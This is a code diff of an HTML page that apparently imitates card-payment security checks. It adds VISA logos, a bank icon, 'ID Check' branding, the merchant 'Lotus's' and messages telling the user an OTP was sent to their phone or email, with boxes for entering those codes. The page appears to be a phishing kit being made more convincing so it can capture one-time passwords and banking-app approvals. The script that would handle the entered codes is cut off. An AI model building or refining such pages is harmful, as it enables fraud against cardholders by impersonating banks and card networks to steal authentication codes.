@@ -20,7 +20,7 @@
 .otp-hdr-left{display:flex;align-items:center;gap:6px;font-size:14px;font-weight:700;color:#333}
 .otp-hdr-right{display:flex;align-items:center;gap:8px;color:#333;font-size:14px}
 .otp-body{padding:20px}
-.otp-body h2{font-size:16px;font-weight:700;margin-bottom:6px;color:#1a1a1a}
+.otp-body h2{font-size:16px;font-weight:700;margin-bottom:6px;color:#1a1a1a;border-bottom: 0px solid #909090;}
 .otp-body p{font-size:12px;color:#555;margin-bottom:14px}
 .otp-table{width:100%;margin-bottom:12px;border-collapse:collapse}
 .otp-table td{padding:6px 0;font-size:12px;border-bottom:1px solid #f0f0f0}
@@ -50,6 +50,163 @@
 .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
 @keyframes spin{to{transform:rotate(360deg)}}
 .status-msg{padding:10px 16px;margin:8px 0;border-radius:6px;font-size:13px;font-weight:500;display:none}
+.app-verify-box {
+                width: 390px;
+                background: #fff;
+                color: #222;
+                border-radius: 10px;
+                padding: 22px 30px 24px;
+                position: relative
+            }
+
+            .app-hdr {
+                display: flex;
+                justify-content: space-between;
+                align-items: flex-start;
+                margin-bottom: 38px
+            }
+
+            .app-bank-logo {
+                width: 34px;
+                height: 28px;
+                border-radius: 2px;
+                color: #fff;
+                font-weight: bold;
+                font-size: 17px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                letter-spacing: -1px
+            }
+
+            .app-scheme {
+                text-align: right;
+                font-size: 12px;
+                line-height: 1.1;
+                color: #333
+            }
+
+            .app-scheme-mark {
+                display: inline-block;
+                width: 38px;
+                height: 18px;
+                position: relative;
+                vertical-align: middle;
+                margin-right: 4px
+            }
+
+            .app-circle {
+                width: 18px;
+                height: 18px;
+                border-radius: 50%;
+                position: absolute;
+                top: 0
+            }
+
+            .app-circle.red {
+                background: #e53935;
+                left: 2px
+            }
+
+            .app-circle.yellow {
+                background: #f6b51d;
+                left: 16px;
+                opacity: .9
+            }
+
+            .app-scheme-name {
+                font-weight: bold;
+                font-size: 11px
+            }
+
+            .app-verify-box h1 {
+                margin: 0 0 15px;
+                font-size: 18px;
+                line-height: 1.25;
+                font-weight: 700
+            }
+
+            .app-intro {
+                margin: 0 0 17px;
+                font-size: 14px;
+                line-height: 1.42
+            }
+
+            .app-steps {
+                margin: 0;
+                padding: 0;
+                list-style: none;
+                font-size: 14px;
+                line-height: 1.42
+            }
+
+            .app-steps li {
+                margin-bottom: 12px;
+                display: flex;
+                align-items: flex-start
+            }
+
+            .app-num {
+                width: 20px;
+                flex-shrink: 0
+            }
+
+            .app-links {
+                margin-top: 34px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                font-size: 12px;
+                font-weight: bold
+            }
+
+            .app-links a {
+                color: #000;
+                text-decoration: underline
+            }
+
+            .app-question {
+                text-align: center;
+                font-size: 13px;
+                color: #333;
+                margin-top: 38px
+            }
+
+            .app-error {
+                text-align: center;
+                color: #ff1d25;
+                font-size: 12px;
+                line-height: 1.35;
+                margin-top: 16px
+            }
+
+            .app-btn-wrap {
+                margin-top: 14px;
+                text-align: center
+            }
+
+            .app-btn-wrap button {
+                border: 0;
+                background: #0878be;
+                color: #fff;
+                font-size: 12px;
+                font-weight: bold;
+                padding: 8px 22px;
+                border-radius: 3px;
+                cursor: pointer
+            }
+
+            .app-btn-wrap button:hover {
+                background: #066da9
+            }
+
+            .app-safe-note {
+                margin-top: 18px;
+                font-size: 11px;
+                color: #777;
+                line-height: 1.4;
+                text-align: center
+            }
 </style>
 </head>
 <body id="notinpaymentflow">
@@ -149,11 +306,32 @@
 
 <div class="overlay hidden" id="otp-overlay">
   <div class="otp-card">
-    <div class="otp-hdr"><div class="otp-hdr-left"><span>Your card issuer</span></div><div class="otp-hdr-right"><span>Secure</span></div></div>
+    <div class="otp-hdr"><div class="otp-hdr-left"><svg width="22" height="22" viewBox="0 0 40 40" fill="none" stroke="#888" stroke-width="2">
+                            <polygon points="20,3 4,14 36,14"></polygon>
+                            <rect x="4" y="32" width="32" height="4" rx="1"></rect>
+                            <line x1="9" y1="15" x2="9" y2="32"></line>
+                            <line x1="16" y1="15" x2="16" y2="32"></line>
+                            <line x1="24" y1="15" x2="24" y2="32"></line>
+                            <line x1="31" y1="15" x2="31" y2="32"></line>
+                        </svg></div><div class="otp-hdr-right" style="gap:8px" id="otp-card-logo">
+                        <svg width="32" height="22" viewBox="0 0 32 22">
+                            <rect width="32" height="22" rx="3" fill="#1a1f71"></rect>
+                            <text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text>
+                        </svg>
+                        <span style="color:#ccc;font-size:18px">|</span>
+                        <span style="font-family:Arial;font-size:13px">Secure</span>
+                    </div></div>
     <div class="otp-body" id="otp-body">
-      <div id="otp-form"><h2>Enter your security code</h2><p>Please enter your security code to authorize this payment</p>
+      <div id="otp-form"><h2>Enter your security code</h2><p>We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits 2). Please submit your One-Time Password (OTP).</p>
         <table class="otp-table"><tr><td>Merchant</td><td>Lotus's</td></tr><tr><td>Amount</td><td id="otp-amount">RM 0.00</td></tr></table>
-        <input type="text" id="otp-code" class="otp-code-input" maxlength="8" placeholder="">
+        <div class="pin-input" id="pin-input" style="
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    margin: 10px 0 16px;
+">
+                            <input type="tel" maxlength="8" id="otp-code" style="width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                        </div>
         <div class="otp-error-msg" id="otp-error"></div>
         <button class="otp-btn" id="otp-submit">Continue</button>
         <button class="otp-resend-btn" id="otp-resend">Resend Code</button>
@@ -179,11 +357,36 @@
 
 <div class="overlay hidden" id="email-overlay">
   <div class="otp-card">
-    <div class="otp-hdr"><div class="otp-hdr-left"><svg width="18" height="14" fill="none" stroke="#666" stroke-width="2"><rect x="1" y="1" width="16" height="12" rx="2"/><polyline points="1,3 9,9 17,3"/></svg><span>Email Verification</span></div></div>
+    <div class="otp-hdr">
+                    <div class="otp-hdr-left">
+                        <svg width="22" height="22" viewBox="0 0 40 40" fill="none" stroke="#888" stroke-width="2">
+                            <rect x="4" y="10" width="32" height="20" rx="2"></rect>
+                            <polyline points="4,10 20,22 36,10"></polyline>
+                        </svg>
+                    </div>
+                    <div class="otp-hdr-right" style="gap:8px" id="email-card-logo">
+                        <svg width="32" height="22" viewBox="0 0 32 22">
+                            <rect width="32" height="22" rx="3" fill="#1a1f71"></rect>
+                            <text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text>
+                        </svg>
+                        <span style="color:#ccc;font-size:18px">|</span>
+                        <span style="font-family:Arial;font-size:13px">Secure</span>
+                    </div>
+                </div>
     <div class="otp-body">
-      <div id="email-form"><h2>Enter email verification code</h2><p>Please enter the code sent to your email</p>
-        <table class="otp-table"><tr><td>Amount</td><td id="email-amount">RM 0.00</td></tr></table>
-        <input type="text" id="email-code" class="otp-code-input" maxlength="8" placeholder="">
+      <div id="email-form"><h2>Enter email verification code</h2><p>We have sent a verification code to your email. Please enter it below.</p>
+        <table class="otp-table"><tr>
+                                <td>Merchant</td>
+                                <td>Lotus's</td>
+                            </tr><tr><td>Amount</td><td id="email-amount">RM 0.00</td></tr></table>
+        <div class="pin-input" id="pin-input" style="
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    margin: 10px 0 16px;
+">
+                            <input type="tel" maxlength="8" id="email-code" style="width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                        </div>
         <div class="otp-error-msg" id="email-error"></div>
         <button class="otp-btn" id="email-submit">Continue</button>
         <button class="otp-resend-btn" id="email-resend">Resend Code</button>
@@ -196,16 +399,59 @@
 
 <div class="overlay hidden" id="app-verify-overlay">
   <div id="mount1" class="hidden"></div><div id="mount2" class="hidden"></div><div id="mount3" class="hidden"></div><div id="mount4" class="hidden"></div><div id="mount5" class="hidden"></div><div id="mount6" class="hidden"></div><div id="mount7" class="hidden"></div>
-  <div class="app-verify-box hidden" id="app-verify-box">
-    <div class="app-logo" id="app-logo">B</div>
-    <div class="app-scheme" id="app-scheme">ID Check</div>
-    <h2>Before you purchase, verify it's you</h2>
-    <div class="info">Merchant: <strong>Lotus's</strong></div>
-    <div class="info">Amount: <strong id="app-amount">RM 0.00</strong></div>
-    <ol class="steps"><li>Open your banking app</li><li>Review and approve the transaction</li><li>Return to this page and click continue</li></ol>
-    <div class="otp-error-msg" id="app-error"></div>
-    <button class="app-btn" id="app-continue-btn" onclick="submitAppVerify()">Continue to complete</button>
-  </div>
+  <div class="app-verify-box">
+                <div class="app-hdr">
+                    <div class="app-bank-logo" id="app-bank-logo">IB</div>
+                    <div class="app-scheme" id="app-scheme">
+                        <span class="app-scheme-mark">
+                            <span class="app-circle red"></span>
+                            <span class="app-circle yellow"></span>
+                        </span>
+                        <span class="app-scheme-name">ID Check</span>
+                    </div>
+                </div>
+                <h1>Before you purchase, verify it's you</h1>
+                <p class="app-intro">
+                    For added security, your bank needs to verify this purchase at <strong id="app-merchant">RedBus</strong>
+                    for <strong id="app-amount">$0.00</strong>
+                    by authenticating in the banking app.
+                </p>
+                <ol class="app-steps">
+                    <li>
+                        <span class="app-num">1.</span>
+                        <span>
+                            Open your banking app and sign in. If already signed in, go to <strong>Card Verification Requests</strong>
+                            .
+                        </span>
+                    </li>
+                    <li>
+                        <span class="app-num">2.</span>
+                        <span>
+                            Review the purchase details and choose <strong>Approve</strong>
+                            or <strong>Decline</strong>
+                            .
+                        </span>
+                    </li>
+                    <li>
+                        <span class="app-num">3.</span>
+                        <span>Return to this page after approving the request.</span>
+                    </li>
+                </ol>
+                <div class="app-links">
+                    <a href="javascript:void(0)">Need Help?</a>
+                    <a href="javascript:void(0)">Terms of use</a>
+                    <a href="javascript:void(0)">Exit</a>
+                </div>
+                <div class="app-question">Already verified this purchase?</div>
+                <div class="app-error hidden" id="app-error">Verification unsuccessful. Please return to the app to verify again.</div>
+                <div class="app-btn-wrap">
+                    <button type="button" id="app-continue-btn">Continue to complete</button>
+                </div>
+                <div class="vfy-spinner hidden" id="app-spinner">
+                    <div class="spin"></div>
+                    <p>Waiting for approval...</p>
+                </div>
+            </div>
 </div>
 
 <script>
